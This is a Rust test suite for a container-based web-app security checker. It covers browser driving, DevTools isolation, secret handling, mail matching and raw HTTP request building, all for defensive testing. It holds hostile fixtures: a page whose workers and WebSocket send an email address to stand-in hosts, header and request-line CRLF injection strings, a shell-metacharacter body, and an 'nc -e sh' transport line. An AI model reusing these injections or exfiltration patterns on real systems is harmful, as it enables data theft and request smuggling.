            app: &server,
            port: 8080,
            mail: None,
            provider: None,
            browser: Some(&browser),
            model: None,
            on_step: None,
        };
        use sv_check::browser::{Action, BrowserCookie, Job};
        use sv_check::signed_in::Http;
        http.browser(&Job {
            actions: vec![
                Action::SetCookies(vec![BrowserCookie::plain("sid", "abc")]),
                Action::Goto("/private".into()),
                Action::Eval("document.title".into()),
                Action::Fill {
                    page: "/form".into(),
                    text: "hi <b>".into(),
                },
                Action::Eval("document.body.innerText".into()),
                Action::SetCookies(vec![BrowserCookie::plain("later", "1")]),
                Action::Goto("/private".into()),
                Action::Eval("document.cookie".into()),
                Action::Act("document.getElementById('bye').click(); true".into()),
                // The cross-site scripting check's own line and question, on a page that puts
                // the text in as markup: the script runs, and the driver's own world must see it
                // (the review of 6 October, item 10).
                Action::Fill {
                    page: "/rawform".into(),
                    text: sv_check::browser::markup_line("feedc0de"),
                },
                Action::Eval(sv_check::browser::markup_question("feedc0de")),
            ],
        })
    });
    let _ = backend.docker(&["rm", "-f", &server, &browser]);
    let _ = backend.docker(&["network", "rm", &network]);
    assert!(
        ready,
        "the app, the browser, or the forwarder did not start: {started:?}"
    );
    let mut answers = answers.flatten().expect("the driver gave no answer");
    assert_eq!(answers.len(), 11, "{answers:?}");
    assert_eq!(answers.remove(0), serde_json::json!({ "refused": [] }));
    assert_eq!(answers[0]["status"], 200, "{answers:?}");
    assert_eq!(answers[0]["path"], "/private", "{answers:?}");
    assert_eq!(answers[1]["value"], "ran", "{answers:?}");
    assert_eq!(answers[2]["found"], true, "{answers:?}");
    assert_eq!(answers[2]["after"]["path"], "/echo", "{answers:?}");
    assert_eq!(answers[3]["value"], "hi <b>", "{answers:?}");
    // A cookie set partway through is sent from then on, and a click is followed to where it
    // leads.
    assert!(
        answers[6]["value"]
            .as_str()
            .is_some_and(|c| c.contains("later=1")),
        "{answers:?}"
    );
    assert_eq!(answers[7]["found"], true, "{answers:?}");
    assert_eq!(answers[7]["after"]["path"], "/bye", "{answers:?}");
    assert_eq!(answers[8]["after"]["path"], "/raw", "{answers:?}");
    assert_eq!(answers[9]["value"]["element"], true, "{answers:?}");
    assert_eq!(answers[9]["value"]["ran"], true, "{answers:?}");
}

#[test]
fn two_factor_codes_are_made_for_the_time_the_containers_read() {
    // The deep review's improvement 5. The clock is read once, from the fence's container; here it
    // shares this computer's, as on Linux, and must be read as no different. Needs a container
    // backend; with one, a failed reading fails.
    let backend = DockerBackend::new();
    if backend.available().is_err() {
        println!("no container backend here; this needs one");
        return;
    }
    let network = format!("sv-clocktest-{}", std::process::id());
    let _ = backend.docker(&["network", "create", "--internal", &network]);
    let via = Via::FreshContainer(&network);
    let read = backend.read_clock_offset(&via);
    let _ = backend.docker(&["network", "rm", &network]);
    assert_eq!(
        read,
        Some(0),
        "the containers' clock was not read, or read wrong"
    );

    // And `now` is moved by what was measured: a machine 48 seconds behind.
    let behind = DockerBackend::new();
    behind.clock_offset.set(-48).unwrap();
    let via = Via::FreshContainer("unused");
    let mut http = DockerHttp {
        backend: &behind,
        via: &via,
        app: "app",
        port: 8080,
        mail: None,
        provider: None,
        browser: None,
        model: None,
        on_step: None,
    };
    use sv_check::signed_in::Http;
    let (ours, theirs) = (host_now(), http.now());
    assert!((ours - 48..=ours - 47).contains(&theirs), "{ours} {theirs}");
}

#[test]
fn the_seed_command_is_given_the_passwords_though_they_are_not_on_the_command_line() {
    // The deep review's improvement 5: the passwords reach the seed from Docker's environment,
    // named with `-e` and no value. Needs a container backend; with one, a failed setup fails.
    let backend = DockerBackend::new();
    if backend.available().is_err() {
        println!("no container backend here; this needs one");
        return;
    }
    let name = format!("sv-seedtest-{}", std::process::id());
    // Started through `prepared` like every container, so read-only (8 October 2026): `/app`,
    // where the seed runs, is a mount here as it is in the app's own container.
    let started = backend.docker(&[
        "run",
        "-d",
        "--rm",
        "--tmpfs",
        "/app",
        "--name",
        &name,
        PROBE_IMAGE,
        "sh",
        "-c",
        "sleep 120",
    ]);
    let accounts = crate::new_accounts(true, true);
    // The seed passes only if each value arrived whole; it compares, and prints nothing.
    let check = format!(
        "test \"$SV_PASSWORD_A\" = '{}' && test \"$SV_PASSWORD_B\" = '{}' && test -n \"$SV_TOTP_SECRET\"",
        accounts.a.password, accounts.b.password
    );
    let seeded = matches!(started, Ok((0, _))).then(|| backend.seed(&name, &check, &accounts));
    let refused = matches!(started, Ok((0, _)))
        .then(|| backend.seed(&name, "test \"$SV_PASSWORD_A\" = 'not it'", &accounts));
    let _ = backend.docker(&["rm", "-f", &name]);
    assert!(
        matches!(started, Ok((0, _))),
        "the container did not start: {started:?}"
    );
    assert!(
        seeded.unwrap().is_ok(),
        "the seed did not get the passwords"
    );
    assert!(refused.unwrap().is_err(), "the seed's check proves nothing");
}

#[test]
fn the_test_provider_is_given_its_secret_though_it_is_not_on_the_command_line() {
    // As the seed's passwords: the client secret reaches the provider from Docker's environment.
    // Needs a container backend; with one, a failed setup fails.
    let backend = DockerBackend::new();
    if backend.available().is_err() {
        println!("no container backend here; this needs one");
        return;
    }
    let network = format!("sv-providertest-{}", std::process::id());
    let name = format!("{network}-idp");
    let _ = backend.docker(&["network", "create", "--internal", &network]);
    let secret = crate::random_hex(16);
    let started = backend.start_provider(&network, &name, &secret);
    let has = |value: &str| {
        let check = format!("test \"$CLIENT_SECRET\" = '{value}'");
        matches!(
            backend.docker(&["exec", &name, "sh", "-c", &check]),
            Ok((0, _))
        )
    };
    let (given, other) = (started && has(&secret), started && has("not it"));
    let _ = backend.docker(&["rm", "-f", &name]);
    let _ = backend.docker(&["network", "rm", &network]);
    assert!(started, "the provider did not start");
    assert!(given, "the provider did not get its secret");
    assert!(!other, "the check proves nothing");
}

#[test]
fn the_app_cannot_reach_the_browser_s_devtools_or_hide_its_storage_from_the_driver() {
    // Deep review S11. The image's own script forwarded DevTools on every address, so the app,
    // on the same fenced network, could drive the browser that checks it; and the driver read
    // in the page's own world, where the app's scripts can redefine what it reads with. Needs
    // a container backend; with one, a failed setup fails.
    let backend = DockerBackend::new();
    if backend.available().is_err() {
        println!("no container backend here; this needs one");
        return;
    }
    let network = format!("sv-devtools-{}", std::process::id());
    let server = format!("{network}-app");
    let browser = format!("{network}-browser");
    let _ = backend.docker(&["network", "create", "--internal", &network]);
    // A page that keeps a token and then hides it from anything reading in its own world.
    let app = r#"
const http = require('http');
http.createServer((q, s) => {
  s.setHeader('content-type', 'text/html');
  s.end(`<script>
    localStorage.setItem('token', 'kept-after-sign-out');
    Storage.prototype.getItem = () => null;
    Object.keys = () => [];
    document.title = 'hidden';
  </script>`);
}).listen(8080);"#;
    let started = backend.docker(&[
        "run",
        "-d",
        "--rm",
        "--name",
        &server,
        "--network",
        &network,
        PROVIDER_IMAGE,
        "node",
        "-e",
        app,
    ]);
    let ready = matches!(started, Ok((0, _))) && backend.start_browser(&network, &browser) && {
        std::thread::sleep(std::time::Duration::from_secs(3));
        backend.forward_browser(&browser, &server, 8080)
    };
    let address = backend
        .docker(&[
            "inspect",
            "-f",
            "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}",
            &browser,
        ])
        .map(|(_, out)| out.trim().to_owned())
        .unwrap_or_default();
    // From the app's own container, by the browser's address, as an app would ask: a name is
    // refused by DevTools itself, an address is not.
    let from_the_app: Vec<(u16, bool)> = [9222u16, 9223]
        .iter()
        .map(|port| {
            let script = format!(
                "fetch('http://{address}:{port}/json/version', {{ signal: \
                     AbortSignal.timeout(3000) }}).then(() => process.exit(0), () => \
                     process.exit(1))"
            );
            let reached = matches!(
                backend.docker(&["exec", &server, "node", "-e", &script]),
                Ok((0, _))
            );
            (*port, reached)
        })
        .collect();
    // The control: from inside the browser's own network, where the driver is, it answers.
    let loopback = backend.docker(&[
        "run",
        "--rm",
        "--network",
        &format!("container:{browser}"),
        PROBE_IMAGE,
        "wget",
        "-q",
        "-O-",
        "-T",
        "3",
        "http://127.0.0.1:9223/json/version",
    ]);
    let answers = ready.then(|| {
        let via = Via::FreshContainer(&network);
        let mut http = DockerHttp {
            backend: &backend,
            via: &via,
            app: &server,
            port: 8080,
            mail: None,
            provider: None,
            browser: Some(&browser),
            model: None,
            on_step: None,
        };
        use sv_check::browser::{Action, Job};
        use sv_check::signed_in::Http;
        http.browser(&Job {
            actions: vec![
                Action::Goto("/".into()),
                Action::Eval("document.title".into()),
                Action::Eval("localStorage.getItem('token')".into()),
                Action::Eval("Object.keys(localStorage).join(',')".into()),
            ],
        })
    });
    let _ = backend.docker(&["rm", "-f", &server, &browser]);
    let _ = backend.docker(&["network", "rm", &network]);
    assert!(
        ready && !address.is_empty(),
        "the app, the browser, or the forwarder did not start: {started:?}"
    );
    assert!(
        matches!(&loopback, Ok((0, out)) if out.contains("Browser")),
        "DevTools did not answer the driver's side either, so nothing below means anything: \
             {loopback:?}"
    );
    assert_eq!(
        from_the_app,
        vec![(9222, false), (9223, false)],
        "the app reached the browser's DevTools"
    );
    let answers = answers.flatten().expect("the driver gave no answer");
    assert_eq!(answers.len(), 4, "{answers:?}");
    // The page's script ran, so what it redefined was redefined.
    assert_eq!(answers[1]["value"], "hidden", "{answers:?}");
    assert_eq!(answers[2]["value"], "kept-after-sign-out", "{answers:?}");
    assert_eq!(answers[3]["value"], "token", "{answers:?}");
}

#[test]
fn what_a_page_sends_elsewhere_from_a_worker_or_over_a_websocket_is_recorded() {
    // Deep review, improvement 5: the driver watched the tab's own requests only, so a page
    // that sent an address elsewhere from a worker, or over a WebSocket, was not seen sending
    // it. Here a page does each, from a worker, a worker's own worker, a shared worker, and a
    // service worker, and a request from the page itself is the control. Needs a container backend; with one, a failed setup fails.
    let backend = DockerBackend::new();
    if backend.available().is_err() {
        println!("no container backend here; this needs one");
        return;
    }
    let network = format!("sv-wsworkers-{}", std::process::id());
    let server = format!("{network}-app");
    let browser = format!("{network}-browser");
    let _ = backend.docker(&["network", "create", "--internal", &network]);
    let app = r#"
const http = require('http');
const scripts = {
  '/worker.js': `fetch('http://collect.example/from-worker?em=a%40example.test').catch(() => {});
                 new Worker('/inner.js');`,
  '/inner.js': `fetch('http://collect.example/from-inner').catch(() => {});`,
  '/sw.js': `fetch('http://collect.example/from-service-worker').catch(() => {});`,
  '/shared.js': `fetch('http://collect.example/from-shared-worker').catch(() => {});`,
};
http.createServer((q, s) => {
  if (scripts[q.url]) {
    s.setHeader('content-type', 'text/javascript');
    return s.end(scripts[q.url]);
  }
  s.setHeader('content-type', 'text/html');
  s.end(`<script>
    fetch('http://collect.example/from-page').catch(() => {});
    new WebSocket('ws://socket.example/live?em=a%40example.test');
    new Worker('/worker.js');
    new SharedWorker('/shared.js');
    navigator.serviceWorker.register('/sw.js');
  </script>`);
}).listen(8080);"#;
    let started = backend.docker(&[
        "run",
        "-d",
        "--rm",
        "--name",
        &server,
        "--network",
        &network,
        PROVIDER_IMAGE,
        "node",
        "-e",
        app,
    ]);
    let ready = matches!(started, Ok((0, _))) && backend.start_browser(&network, &browser) && {
        std::thread::sleep(std::time::Duration::from_secs(3));
        backend.forward_browser(&browser, &server, 8080)
    };
    let answers = ready.then(|| {
        let via = Via::FreshContainer(&network);
        let mut http = DockerHttp {
            backend: &backend,
            via: &via,
            app: &server,
            port: 8080,
            mail: None,
            provider: None,
            browser: Some(&browser),
            model: None,
            on_step: None,
        };
        use sv_check::browser::{Action, Job};
        use sv_check::signed_in::Http;
        http.browser(&Job {
            actions: vec![
                Action::Goto("/account".into()),
                Action::Wait(2000),
                Action::Outside,
            ],
        })
    });
    let _ = backend.docker(&["rm", "-f", &server, &browser]);
    let _ = backend.docker(&["network", "rm", &network]);
    assert!(
        ready,
        "the app, the browser, or the forwarder did not start: {started:?}"
    );
    let answers = answers.flatten().expect("the driver gave no answer");
    let requests = answers[2]["requests"]
        .as_array()
        .cloned()
        .unwrap_or_default();
    let sent = |url: &str| requests.iter().find(|r| r["url"] == url).cloned();
    // Each is recorded once, though a service worker reaches the driver twice.
    let mut urls: Vec<&str> = requests.iter().filter_map(|r| r["url"].as_str()).collect();
    let all = urls.len();
    urls.sort_unstable();
    urls.dedup();
    assert_eq!(urls.len(), all, "{requests:#?}");
    // The control: the page's own request, as before.
    assert!(
        sent("http://collect.example/from-page").is_some(),
        "{answers:?}"
    );
    let socket = sent("ws://socket.example/live?em=a%40example.test")
        .unwrap_or_else(|| panic!("the WebSocket was not recorded: {requests:#?}"));
    assert_eq!(
        (&socket["type"], &socket["page"]),
        (&"WebSocket".into(), &"/account".into())
    );
    let worker = sent("http://collect.example/from-worker?em=a%40example.test")
        .unwrap_or_else(|| panic!("the worker's request was not recorded: {requests:#?}"));
    assert_eq!(worker["page"], "/worker.js", "{worker:?}");
    assert!(
        sent("http://collect.example/from-inner").is_some(),
        "the worker's own worker's request was not recorded: {requests:#?}"
    );
    assert!(
        sent("http://collect.example/from-service-worker").is_some(),
        "the service worker's request was not recorded: {requests:#?}"
    );
    assert!(
        sent("http://collect.example/from-shared-worker").is_some(),
        "the shared worker's request was not recorded: {requests:#?}"
    );
}

#[test]
fn a_host_prefixed_cookie_signs_the_browser_in_and_a_refused_one_is_named() {
    // family-hub (3 October 2026): its session cookie was `__Host-fh_session`, `Secure`, and
    // the browser refused it when handed its name and value alone, so the browser checks said
    // the browser was not signed in. Here an app that opens /private only for `__Host-sid`,
    // in sv's own Chromium, through the real driver. Needs a container backend; with one, a
    // failed setup fails.
    let backend = DockerBackend::new();
    if backend.available().is_err() {
        println!("no container backend here; this needs one");
        return;
    }
    let network = format!("sv-hostcookie-{}", std::process::id());
    let server = format!("{network}-app");
    let browser = format!("{network}-browser");
    let _ = backend.docker(&["network", "create", "--internal", &network]);
    let app = r#"
const http = require('http');
http.createServer((q, s) => {
  s.setHeader('content-type', 'text/html');
  const cookies = q.headers.cookie || '';
  const signed = cookies.split('; ').includes('__Host-sid=abc');
  if (q.url === '/private' && !signed) { s.writeHead(302, { location: '/login' }); return s.end(); }
  if (q.url === '/private') return s.end('<p>mine</p>');
  if (q.url === '/sent') return s.end('<pre id=c>' + cookies.replace(/</g, '') + '</pre>');
  s.end('<p>login</p>');
}).listen(8080);"#;
    let started = backend.docker(&[
        "run",
        "-d",
        "--rm",
        "--name",
        &server,
        "--network",
        &network,
        PROVIDER_IMAGE,
        "node",
        "-e",
        app,
    ]);
    let ready = matches!(started, Ok((0, _))) && backend.start_browser(&network, &browser) && {
        std::thread::sleep(std::time::Duration::from_secs(3));
        backend.forward_browser(&browser, &server, 8080)
    };
    use sv_check::browser::{Action, BrowserCookie, Job};
    use sv_check::signed_in::Http;
    // As family-hub set it: `Secure`, `HttpOnly`, `SameSite=Lax`, path `/`.
    let session = BrowserCookie {
        name: "__Host-sid".into(),
        value: "abc".into(),
        secure: true,
        http_only: true,
        path: Some("/".into()),
        same_site: Some("lax".into()),
    };
    // Larger than the 4,096 bytes a browser keeps of a cookie's name and value: plain
    // requests carry it, a browser does not.
    let big = BrowserCookie::plain("big", &"x".repeat(5000));
    let jobs = [
        // The session cookie and one the browser will refuse; the page opens, the refused one
        // is named, and what the browser sends back shows the one it kept.
        Job {
            actions: vec![
                Action::SetCookies(vec![session.clone(), big]),
                Action::Goto("/private".into()),
                Action::Goto("/sent".into()),
                Action::Eval("document.getElementById('c').textContent".into()),
                // `HttpOnly` was carried: the page's own scripts cannot read it.
                Action::Eval("document.cookie".into()),
            ],
        },
        // The prefix alone makes the cookie `Secure`, so an app that left `Secure` out of its
        // header still signs the browser in, as the owner decided on 4 October 2026.
        Job {
            actions: vec![
                Action::SetCookies(vec![BrowserCookie::plain("__Host-sid", "abc")]),
                Action::Goto("/private".into()),
            ],
        },
    ];
    let answers: Vec<Option<Vec<serde_json::Value>>> = if ready {
        let via = Via::FreshContainer(&network);
        let mut http = DockerHttp {
            backend: &backend,
            via: &via,
            app: &server,
            port: 8080,
            mail: None,
            provider: None,
            browser: Some(&browser),
            model: None,
            on_step: None,
        };
        jobs.iter().map(|job| http.browser(job)).collect()
    } else {
        Vec::new()
    };
    let _ = backend.docker(&["rm", "-f", &server, &browser]);
    let _ = backend.docker(&["network", "rm", &network]);
    assert!(
        ready,
        "the app, the browser, or the forwarder did not start: {started:?}"
    );
    let first = answers[0].clone().expect("the driver gave no answer");
    assert_eq!(first.len(), 5, "{first:?}");
    let refused = first[0]["refused"]
        .as_array()
        .expect("an answer about refusals");
    assert_eq!(refused.len(), 1, "{first:?}");
    assert_eq!(refused[0]["name"], "big", "{first:?}");
    assert!(
        refused[0]["why"].as_str().is_some_and(|w| !w.is_empty()),
        "{first:?}"
    );
    assert_eq!(first[1]["path"], "/private", "signed in: {first:?}");
    assert_eq!(first[1]["status"], 200, "{first:?}");
    // The setup worked: the app saw the cookie the browser kept, and not the refused one.
    assert_eq!(first[3]["value"], "__Host-sid=abc", "{first:?}");
    assert_eq!(first[4]["value"], "", "{first:?}");

    let second = answers[1].clone().expect("the driver gave no answer");
    assert_eq!(
        second[0],
        serde_json::json!({ "refused": [] }),
        "{second:?}"
    );
    assert_eq!(second[1]["path"], "/private", "signed in: {second:?}");
}

#[test]
fn the_mail_server_is_fenced_and_hardened_like_the_sidecar() {
    let args = mail_args("sv-1-net", "sv-1-mail");
    hardened_by_prepared(&args);
    let at = args.iter().position(|a| *a == "--network").unwrap();
    assert_eq!(args[at + 1], "sv-1-net");
    // Nothing published: the only way to it is from inside the fence.
    assert!(
        !args
            .iter()
            .any(|a| *a == "-p" || a.starts_with("--publish"))
    );
}

#[test]
fn mail_is_matched_to_its_address_in_any_recipient_field_oldest_first() {
    // As Mailpit answers: newest first, a message sent with the user only in Bcc, and one for
    // somebody else.
    let listing = r#"{"messages":[
            {"ID":"3","To":[{"Name":"","Address":"A@Example.test"}],"Cc":null,"Bcc":[]},
            {"ID":"2","To":[{"Address":"other@example.test"}],"Cc":[],"Bcc":[]},
            {"ID":"1","To":[],"Cc":[],"Bcc":[{"Address":"a@example.test"}]}
        ]}"#;
    assert_eq!(
        mail_ids_to(listing, "a@example.test"),
        Some(vec!["1".to_owned(), "3".to_owned()])
    );
    assert_eq!(mail_ids_to(listing, "nobody@example.test"), Some(vec![]));
    // Not a list at all is not an empty mailbox.
    assert_eq!(mail_ids_to("<html>502</html>", "a@example.test"), None);
}

#[test]
fn a_messages_text_has_both_its_parts() {
    let text =
        mail_text(r#"{"Text":"plain http://x/reset?token=1","HTML":"<a href='y'>"}"#).unwrap();
    assert!(
        text.contains("token=1") && text.contains("<a href='y'>"),
        "{text}"
    );
    assert!(
        mail_text(r#"{"HTML":"<p>only html</p>"}"#)
            .unwrap()
            .contains("only html")
    );
}

fn req(method: &str, path: &str, headers: &[(&str, &str)]) -> sv_check::probes::ProbeRequest {
    sv_check::probes::ProbeRequest {
        id: "t".into(),
        method: method.into(),
        path: path.into(),
        headers: headers
            .iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect(),
        body: None,
    }
}

#[test]
fn a_body_goes_out_framed_by_its_length() {
    // A body is the one part of a request that may contain anything, newlines included; its
    // length is what stops the server reading past it into a second request.
    let mut r = req(
        "POST",
        "/login",
        &[("Content-Type", "application/x-www-form-urlencoded")],
    );
    r.body = Some("user=a&password=b\r\n\r\nGET /admin HTTP/1.0".into());
    let raw = request_bytes(&r, "app").expect("a body does not stop the request");
    let raw = String::from_utf8(raw).unwrap();
    let (head, body) = raw.split_once("\r\n\r\n").unwrap();
    assert!(
        head.contains(&format!("Content-Length: {}", body.len())),
        "{head}"
    );
    assert_eq!(body, r.body_text());
}

#[test]
fn a_body_that_is_not_text_goes_out_byte_for_byte() {
    // An archive is bytes of every value, most of them not text. Each must arrive as it was.
    let mut r = req("POST", "/upload", &[]);
    let bytes: Vec<u8> = (0..=255u8).cycle().take(1000).collect();
    r.body = Some(bytes.clone());
    let raw = request_bytes(&r, "app").unwrap();
    let at = raw.windows(4).position(|w| w == b"\r\n\r\n").unwrap() + 4;
    assert_eq!(&raw[at..], &bytes[..]);
    let head = String::from_utf8(raw[..at].to_vec()).unwrap();
    assert!(head.contains("Content-Length: 1000\r\n"), "{head}");
}

#[test]
fn a_request_naming_its_own_host_is_sent_with_that_one_only() {
    let raw = request_bytes(
        &req("POST", "/mcp", &[("Host", "sv-rebind.invalid")]),
        "app",
    )
    .expect("a Host header is allowed");
    let raw = String::from_utf8(raw).unwrap();
    let hosts: Vec<&str> = raw
        .lines()
        .filter(|l| l.to_ascii_lowercase().starts_with("host:"))
        .collect();
    assert_eq!(hosts, ["Host: sv-rebind.invalid"], "{raw}");
    // The control: without one, the app's own name is sent.
    let raw = String::from_utf8(request_bytes(&req("POST", "/mcp", &[]), "app").unwrap()).unwrap();
    assert!(raw.contains("\r\nHost: app\r\n"), "{raw}");
}

#[test]
fn an_ordinary_request_is_written_out_in_full() {
    let raw = request_bytes(
        &req("GET", "/healthz", &[("Origin", "https://x.invalid")]),
        "app",
    )
    .expect("nothing wrong with this one");
    assert_eq!(
        String::from_utf8(raw).unwrap(),
        "GET /healthz HTTP/1.0\r\nHost: app\r\nConnection: close\r\nOrigin: https://x.invalid\r\n\r\n"
    );
}

#[test]
fn a_newline_in_the_path_sends_nothing() {
    // The path is the app's own `health_path`, out of its manifest. Sending it as given would
    // let it add headers, or a whole second request, to what `sv` asked.
    assert!(request_bytes(&req("GET", "/a\r\nX-Injected: 1", &[]), "app").is_none());
    assert!(request_bytes(&req("GET", "/a\nX-Injected: 1", &[]), "app").is_none());
    // A space would break the request line into a different request just as effectively.
    assert!(request_bytes(&req("GET", "/a HTTP/1.1", &[]), "app").is_none());
}

#[test]
fn a_newline_in_a_header_sends_nothing_either() {
    // Second witness, of a different shape: the header block rather than the request line, and
    // the name as well as the value.
    assert!(request_bytes(&req("GET", "/", &[("Origin", "a\r\nX-Injected: 1")]), "app").is_none());
    assert!(request_bytes(&req("GET", "/", &[("X\r\nY", "z")]), "app").is_none());
    assert!(request_bytes(&req("GET", "/", &[("X: Y", "z")]), "app").is_none());
    // And the method, which is the third place text reaches the request line.
    assert!(request_bytes(&req("GET /x HTTP/1.1\r\n", "/", &[]), "app").is_none());
    // The container name too, though `sv` chooses that one.
    assert!(request_bytes(&req("GET", "/", &[]), "app\r\nX: 1").is_none());
}

#[test]
fn every_request_the_suite_makes_goes_out_and_none_of_them_would_if_tampered_with() {
    // Second witness for the header check, of a different shape: the real suite rather than a
    // hand-written request, and a loop rather than one case — so a header `sv` adds later is
    // covered the day it is added.
    let requests = sv_check::probes::requests("/healthz");
    assert!(requests.len() >= 4);
    for request in &requests {
        assert!(
            request_bytes(request, "app").is_some(),
            "the suite's own request must be sendable: {request:?}"
        );
        let mut tampered = request.clone();
        tampered
            .headers
            .push(("X-Added".to_owned(), "value\r\nX-Injected: 1".to_owned()));
        assert!(
            request_bytes(&tampered, "app").is_none(),
            "a header carrying a newline must stop the whole request: {tampered:?}"
        );
    }
}

#[test]
fn no_part_of_a_request_is_ever_in_the_shell_command() {
    // The request is what the container reads, never part of what its shell runs: the command
    // is built from the app's name and port alone, so nothing a request carries (a quote, a
    // `;`, a file name somebody chose) can become a command. And a request that would split
    // into two is refused before it is anything.
    let bad = req("GET", "/a\r\nX-Injected: 1", &[]);
    assert!(request_bytes(&bad, "app").is_none());
    let script = exchange_script("app", 8080);
    assert_eq!(
        script,
        "f=$(mktemp) && cat > \"$f\" && timeout 15 nc -w 5 app 8080 -e sh -c \"cat $f; cat 1>&2\" 2>&1; rm -f \"$f\""
    );
    let mut hostile = req("POST", "/upload", &[]);
    hostile.body = Some(b"name='quoted';$(echo x)`echo y`".to_vec());
    let raw = request_bytes(&hostile, "app").unwrap();
    assert!(
        raw.ends_with(b"`echo y`"),
        "the body is sent, as it is, as input"
    );
}

#[test]
fn a_raw_response_is_split_into_status_headers_and_body() {
    let raw = "HTTP/1.1 404 Not Found\r\nContent-Type: text/html\r\nSet-Cookie: a=b; HttpOnly\r\n\r\n<h1>nope</h1>";
    let parsed = parse_response("missing", raw).expect("parses");
    assert_eq!(parsed.status, 404);
    assert_eq!(parsed.header("content-type"), Some("text/html"));
    assert_eq!(parsed.body, "<h1>nope</h1>");
}

#[test]
fn a_header_value_containing_a_colon_keeps_it() {
    // `Location: https://x/y` splits on the wrong colon if the split is not limited to the first.
    let raw = "HTTP/1.1 302 Found\r\nLocation: https://example.com/next\r\n\r\n";
    let parsed = parse_response("r", raw).expect("parses");
    assert_eq!(parsed.header("location"), Some("https://example.com/next"));
}

#[test]
fn a_response_using_bare_newlines_is_still_read() {
    let parsed = parse_response("r", "HTTP/1.0 200 OK\nX-A: b\n\nbody here").expect("parses");
    assert_eq!(parsed.status, 200);
    assert_eq!(parsed.header("x-a"), Some("b"));
    assert_eq!(parsed.body, "body here");
}

#[test]
fn something_that_is_not_http_is_not_invented_into_a_response() {
    assert!(parse_response("r", "").is_none());
    assert!(parse_response("r", "connection refused").is_none());
    assert!(parse_response("r", "HTTP/1.1 notanumber OK\r\n\r\n").is_none());
}
